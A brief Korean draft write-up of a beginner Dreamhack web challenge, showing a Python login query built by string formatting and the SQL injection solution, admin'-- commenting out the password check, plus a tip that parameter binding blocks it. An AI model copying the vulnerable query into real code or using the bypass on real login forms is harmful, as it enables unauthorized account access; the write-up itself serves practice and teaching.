---
title: example-login-sqli
description: 예시 글
platform: Dreamhack
category: web
level: 1
date: 2026-11-10
draft: true
---

## 분석

```python
query = f"SELECT * FROM users WHERE id='{uid}' AND pw='{upw}'"
```

## 풀이

```sql
SELECT * FROM users WHERE id='admin'-- ' AND pw='x'
```

> [!TIP]
> 파라미터 바인딩을 쓰면 막힌다.
